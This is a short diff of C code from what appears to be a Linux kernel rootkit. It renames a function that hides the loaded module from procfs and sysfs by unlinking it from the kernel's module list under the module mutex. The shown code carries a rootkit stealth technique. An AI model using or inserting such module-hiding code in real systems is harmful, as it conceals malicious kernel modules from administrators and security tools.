@@ -3,7 +3,7 @@
 #include "module.h"
 #include "../../utils.h"
 
-static void rooti_hideme_from_procs(void)
+static void rooti_hideme_from_procfs(void)
 {
     list_del_rcu(&THIS_MODULE->list);
     synchronize_rcu();
@@ -23,7 +23,7 @@ int rooti_hideme()
     ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
 
     mutex_lock(__module_mutex);
-    rooti_hideme_from_procs();
+    rooti_hideme_from_procfs();
     rooti_hideme_from_sysfs();
     mutex_unlock(__module_mutex);
 
